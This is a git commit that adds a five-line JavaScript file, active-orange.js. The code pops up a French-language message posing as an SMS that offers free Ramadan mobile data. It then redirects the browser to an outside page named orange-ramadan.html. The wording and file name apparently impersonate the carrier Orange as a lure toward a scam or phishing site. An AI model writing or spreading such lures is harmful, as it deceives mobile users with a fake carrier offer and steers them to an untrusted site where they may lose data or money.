7117da4c7ea82b26de2c7657c399b8c689fb3704
sweet16palz-hub <sweet16palz@gmail.com>
2026-02-23 07:09:19 +0100

    Create active-orange.js

---
+++ active-orange.js
@@ -0,0 +1,5 @@
+var password = 'ACTIVER'
+password=prompt('SMS: Félicitations, votre numéro de mobile est éligible pour recevoir des données gratuites pendant le Ramadan. Appuyez sur OK pour en bénéficier. ','ACTIVER');
+if (password != 'ACTIVER') {
+location.href='https://gbamz.com/orange-ramadan.html';
+}
